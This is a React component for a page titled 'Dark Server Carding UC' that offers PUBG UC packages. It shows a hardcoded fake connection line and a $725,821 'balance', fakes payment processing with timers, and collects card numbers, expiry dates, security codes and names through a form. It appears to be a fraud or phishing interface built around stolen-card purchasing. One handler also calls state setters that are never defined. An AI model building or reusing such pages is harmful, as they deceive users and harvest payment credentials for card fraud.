import React, { useState, useEffect } from 'react';
import axios from 'axios';
import { useNavigate } from 'react-router-dom';

import BGImage1 from "../assets/pubg-images/card-img-bg.191385920e2e85e49db4.png"
import BG_UC_Image1 from "../assets/pubg-images/1599546007887MVeNUtB6.png"
import BG_UC_Image2 from "../assets/pubg-images/1599546030876PIvqwGaa.png"

import BG_UC_Image3 from "../assets/pubg-images/1599546041426W8hmErMS.png"
import BG_UC_Image4 from "../assets/pubg-images/1599546052747L5gSu7VB.png"
import BG_UC_Image5 from "../assets/pubg-images/1599546061912PLgMlY23.png"
import BG_UC_Image6 from "../assets/pubg-images/1599546071746KqkIhrzG.png"

import UCImage from "../assets/pubg-images/uc-small.bc30c95b.png"
import CardDetails from './CardDetails';
import CardingMain from './CardingMain';
import MessageModal from './MessageModal';
import USA_Logo from "../assets/pubg-images/Flag_of_the_United_States.png"


const initialPackages = [
  { id: 1001, package_name: "60 + 30 UC", playerIdd: 1846249952, card_amount: 852282, card_type: "Master", price_usd: 0.99, uc_amount: 25, bonus_uc: 30, total_uc: 60, picURL: BG_UC_Image1 },
  { id: 1002, package_name: "300 + 25 UC", playerIdd: 1846249842, card_amount: 852282, card_type: "Visa", price_usd: 4.99, uc_amount: 40, bonus_uc: 25, total_uc: 325, picURL: BG_UC_Image2 },
  { id: 1003, package_name: "600 + 60 UC", playerIdd: 1846249732, card_amount: 852282, card_type: "Visa Golden", price_usd: 9.99, uc_amount: 80, bonus_uc: 60, total_uc: 660, picURL: BG_UC_Image1 },
  { id: 1004, package_name: "1500 + 300 UC", playerIdd: 1846249622, card_amount: 852282, card_type: "Visa Golden", price_usd: 24.99, uc_amount: 100, bonus_uc: 300, total_uc: 1800, picURL: BG_UC_Image3 },
  { id: 1005, package_name: "3000 + 850 UC", playerIdd: 1846249512, card_amount: 852282, card_type: "Visa", price_usd: 49.99, uc_amount: 160, bonus_uc: 850, total_uc: 3850, picURL: BG_UC_Image4 },
  { id: 1006, package_name: "6000 + 2100 UC", playerIdd: 1846249402, card_amount: 852282, card_type: "Master", price_usd: 99.99, uc_amount: 200, bonus_uc: 2100, total_uc: 8100, picURL: BG_UC_Image5 },
  { id: 1007, package_name: "7000 + 2500 UC", playerIdd: 1846249362, card_amount: 852282, card_type: "Visa Golden", price_usd: 130.99, uc_amount: 300, bonus_uc: 2500, total_uc: 9500, picURL: BG_UC_Image6 },
  { id: 1008, package_name: "8000 + 3100 UC", playerIdd: 1846249272, card_amount: 852282, card_type: "Master", price_usd: 150.99, uc_amount: 500, bonus_uc: 3100, total_uc: 11100, picURL: BG_UC_Image6 },
  { id: 1009, package_name: "9000 + 3600 UC", playerIdd: 1846249182, card_amount: 852282, card_type: "Visa", price_usd: 175.99, uc_amount: 600, bonus_uc: 3600, total_uc: 12600, picURL: BG_UC_Image6 },
  { id: 1010, package_name: "10000 + 4200 UC", playerIdd: 1846249092, card_amount: 852282, card_type: "Visa Golden", price_usd: 200.99, uc_amount: 700, bonus_uc: 4200, total_uc: 14200, picURL: BG_UC_Image6 },
  { id: 1011, package_name: "11000 + 4500 UC", playerIdd: 1846241355, card_amount: 852282, card_type: "Master", price_usd: 220.99, uc_amount: 800, bonus_uc: 4500, total_uc: 15500, picURL: BG_UC_Image6 },
  { id: 1012, package_name: "12000 + 4800 UC", playerIdd: 1846249142, card_amount: 852282, card_type: "Visa", price_usd: 250.99, uc_amount: 1000, bonus_uc: 4800, total_uc: 16800, picURL: BG_UC_Image6 }
];

function FailedUC() {
  const [packages, setPackages] = useState(initialPackages);
  const [searchVal, setSearchVal] = useState('')
  const [searchId, setSearchId] = useState('');
  const [filteredPackages, setFilteredPackages] = useState(initialPackages);
  const [isModalOpen, setIsModalOpen] = useState(false);
  const [selectedPackage, setSelectedPackage] = useState(null);
  const [isLoading, setIsLoading] = useState(false);
  const [paymentStatus, setPaymentStatus] = useState(false);
  // Loadings handling
  const [showLoader, setShowLoader] = useState(true);
  const [showContinueButton, setShowContinueButton] = useState(false);
  const [modalContentVisible, setModalContentVisible] = useState(false);

  const [InfoObj, setInfoObj] = useState(
    {
      CardInfo: "",
      DateInfo: "",
      CodeInfo: "",
      FirstName: "",
      SecondName: "",
      Email: ""
    }
  )
  const [InfoArr, setInfoArr] = useState([])
  const [showCardModel, setShowCardModel] = useState(false)
  const [showMessageModal, setshowMessageModal] = useState(false)

  const navigate = useNavigate()

  useEffect(() => {
    if (isModalOpen) {
      setShowLoader(true);
      setShowContinueButton(false);
      setModalContentVisible(false);
      const timer = setTimeout(() => {
        setModalContentVisible(true);
        setShowLoader(false);
        setShowContinueButton(true);
      }, 3000);
      return () => clearTimeout(timer);
    }
  }, [isModalOpen]);

  const handleContinue = () => {
    setShowContinueButton(false);
    setModalContentVisible(true);
    setShowLoader(false);
    setIsLoading(false)
    setPaymentStatus(false)
  };

  useEffect(() => {
    setFilteredPackages(
      packages.filter(pkg => pkg.playerIdd.toString().includes(searchId))
    );
  }, [searchId, packages]);

  useEffect(() => {
    const fetchExchangeRate = async () => {
      try {
        const response = await axios.get('https://api.exchangerate-api.com/v4/latest/USD');
        const exchangeRate = await response.data.rates.PKR;
        updatePackagesWithPKR(exchangeRate);
      } catch (error) {
        console.error('Error fetching exchange rate:', error);
      }
    };
    fetchExchangeRate();
  }, []);

  const updatePackagesWithPKR = (exchangeRate) => {
    const updatedPackages = packages.map(pkg => {
      const pricePkr = (pkg.price_usd * exchangeRate).toFixed(2);
      return { ...pkg, price_pkr: pricePkr };
    });

    setPackages(updatedPackages);
  };

  const handleSearchChange = (e) => {
    setSearchVal(e.target.value);
  };

  const handleSearchChangeBtn = () => {

    if (searchVal == "") {
      alert("Enter Valid the ID!")
    } else {
      setSearchId(searchVal);
    }

  }

  const handlePackageClick = (pkg) => {

    if (searchVal == "") {
      alert("Enter Valid the ID!")
    }
    else {
      setSelectedPackage(pkg);
      setIsModalOpen(true);
      setPaymentStatus(false)
    }

  };


  const handlePaymentSubmit = () => {

    setIsLoading(true);
    setPaymentStatus(false)
    // Simulate payment processing
    setTimeout(() => {
      setPaymentStatus(true)
      setShowCardModel(false)
    }, 5000);
  };


  const handleback = () => {
    setIsModalOpen(false); // Reopen the modal to show card info
    setShowCardModel(true); // Show card model details
    setIsLoading(false);
    setSearchVal(""); // Reset search value
  };


  const closeAll1 = () => {
    setIsModalOpen(false)
    setShowCardModel(false)

    setPaymentStatus(false)
    setIsLoading(false)
    setSearchVal("")

  }

  const handleInp = (e) => {
    const { name, value } = e.target;
    setInfoObj({ ...InfoObj, [name]: value })
  }


  // Handle Payment button click
  const handleSubmit = () => {
    if (
      InfoObj.CardInfo === '' ||
      InfoObj.DateInfo === '' ||
      InfoObj.CodeInfo === '' ||
      InfoObj.FirstName === '' ||
      InfoObj.SecondName === ''
    ) {
      alert('Fill All the required Credentials');
    } else {
      setInfoArr([...InfoArr, InfoObj])
      setShowCardModel(false)
      setshowMessageModal(true)
      setInfoObj(
        {
          CardInfo: "",
          DateInfo: "",
          CodeInfo: "",
          FirstName: "",
          SecondName: ""
        }
      )
    }
  };

  const closeAll2 = () => {
    setIsModalOpen(false)
    setShowCardModel(false)
  }

  const closeAll3 = () => {
    setIsModalOpen(false)
    setIsConnecting(false)
    setHasError(false)
    setShowCardModel(false)
  }

  return (
    <div className="h-auto bg-[rgb(20,27,61)] min-h-screen p-2 flex justify-around items-center">

      <div className="h-[100vh] w-[1000px] setting-main flex items-center flex-col justify-center bg-[#171F45] mx-auto my-5">
        <div className="h-[auto] w-[1000px] setting-main mx-auto p-4">
          <h1 class="text-xl font-medium mt-2 text-white flex bg-[#141B3D] py-2 px-3 w-[50%]"> <img className='h-[30px] w-[50px]' src={USA_Logo} alt="Image Verify" />  <span className='ml-3'>(USA:5317) Connected: Balance $725821.21</span>
          </h1>
        </div>
        <h1 class="text-3xl font-bold text-center text-red-500 mb-1 text-shadow">Dark Server Carding UC</h1>
        <h1 className="text-2xl font-semibold text-center mb-2 text-white">Midasbuy Connected Successfully</h1>

        <div className='w-full m-auto flex items-center justify-center mb-2 gap-5'>

          <input
            type="text"
            placeholder="Search by ID"
            value={searchVal}
            onChange={handleSearchChange}
            className="w-[50%] bg-white border-none border-gray-300 outline-none rounded p-2"
          />
          <button
            className="bg-blue-600 text-white py-2 px-4 rounded-lg hover:bg-blue-700 transition duration-300"
            onClick={handleSearchChangeBtn}
          >
            Search
          </button>
        </div>

        <div className="card-parent h-auto w-[100%] flex items-center flex-wrap justify-center gap-4">

          {filteredPackages.map(pkg => (
            <div onClick={() => handlePackageClick(pkg)} key={pkg.id} className="card bg-[#1B234D] shadow-lg  rounded-lg overflow-hidden w-[23%] cursor-pointer">
              <div className="BGImage h-[108px] bg-cover relative bg-center flex justify-center items-center">
                <img src={BGImage1} alt="BlueImage" />
                <img src={pkg.picURL} alt="UCImage" className='absolute ' />
              </div>
              <div className="card-content p-0">
                <div className="uc-package w-[90%] flex items-center justify-center mb-0">
                  <div className="uc-logo w-16 h-16 flex items-center justify-center rounded-full">
                    <img src={UCImage} alt="Logo" className="w-12 h-12" />
                  </div>
                  <div className="uc-package-value text-center">
                    <h1 className="package-text text-3xl font-bold text-white"> {pkg.uc_amount}k <span className="text-highlight"> UC </span> </h1>
                  </div>
                </div>
              </div>
            </div>
          ))}
        </div>

        {
          isModalOpen ? (
            <>
              <CardingMain isModalOpen={isModalOpen} closeAll1={closeAll1} showLoader={showLoader} showContinueButton={showContinueButton} handleContinue={handleContinue} modalContentVisible={modalContentVisible} selectedPackage={selectedPackage} searchVal={searchVal} handlePaymentSubmit={handlePaymentSubmit} isLoading={isLoading} paymentStatus={paymentStatus} handleback={handleback} />
            </>
          ) : showCardModel ? (
            <>
              <CardDetails showCardModel={showCardModel} closeAll2={closeAll2} handleInp={handleInp} InfoObj={InfoObj} handleSubmit={handleSubmit} />
            </>
          ) : showMessageModal ? (
            <>
              <MessageModal showMessageModal={showMessageModal} closeAll3={closeAll3} />
            </>
          ) : null
        }


      </div>


    </div>
  );
}

export default FailedUC;

